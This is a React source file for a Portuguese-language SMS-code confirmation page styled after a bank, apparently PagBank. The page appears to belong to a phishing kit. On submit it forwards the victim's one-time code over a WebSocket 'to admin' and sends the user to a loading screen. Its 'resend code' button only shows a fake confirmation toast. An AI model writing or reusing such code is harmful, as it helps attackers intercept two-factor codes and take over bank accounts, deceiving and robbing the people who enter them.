import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { useSocket } from "@/hooks/useSocket";

export default function SmsCodePage() {
  const [smsCode, setSmsCode] = useState<string[]>(Array(6).fill(""));
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null));
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const { socket } = useSocket();

  const handleInputChange = (index: number, value: string) => {
    if (/^\d*$/.test(value)) {
      const newCode = [...smsCode];
      newCode[index] = value.slice(0, 1);
      setSmsCode(newCode);
      
      // Auto-focus next input
      if (value && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
      
      if (error) {
        setError("");
      }
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !smsCode[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async () => {
    const code = smsCode.join("");
    
    if (code.length !== 6) {
      setError("Por favor, digite o código completo de 6 dígitos");
      return;
    }
    
    setIsLoading(true);
    
    try {
      const res = await apiRequest("POST", "/api/user/verify-sms", { code });
      
      if (res.ok) {
        // Send SMS code to admin through WebSocket
        if (socket && socket.readyState === WebSocket.OPEN) {
          socket.send(JSON.stringify({
            type: "SMS_CODE",
            data: { code }
          }));
        }
        
        navigate("/loading");
      }
    } catch (err) {
      console.error(err);
      toast({
        title: "Erro",
        description: "Ocorreu um erro ao validar o código SMS",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleResendCode = () => {
    toast({
      title: "Código reenviado",
      description: "Um novo código foi enviado para o seu telefone",
    });
  };

  useEffect(() => {
    // Focus the first input on component mount
    inputRefs.current[0]?.focus();
  }, []);

  return (
    <div className="flex-grow flex flex-col items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-white rounded-lg p-6 shadow-sm border border-gray-200">
          <div className="mb-6 text-center">
            <h2 className="text-xl font-medium mb-4">Confirmação de segurança</h2>
            <p className="text-gray-600">Preencha o código de 6 dígitos recebido por SMS</p>
          </div>
          
          <div className="flex justify-between mb-6">
            {Array(6).fill(0).map((_, index) => (
              <input 
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                className="w-12 h-12 border border-gray-300 rounded text-center text-xl focus:outline-none focus:ring-2 focus:ring-primary"
                maxLength={1}
                value={smsCode[index]}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
              />
            ))}
          </div>
          
          {error && (
            <div className="text-red-500 text-sm text-center mb-4">{error}</div>
          )}
          
          <button 
            className="pagbank-button-primary"
            onClick={handleSubmit}
            disabled={isLoading}
          >
            {isLoading ? "Processando..." : "Confirmar"}
          </button>
          
          <div className="text-center mt-4">
            <button 
              className="text-primary hover:underline font-medium"
              onClick={handleResendCode}
              disabled={isLoading}
            >
              Não recebi o código
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
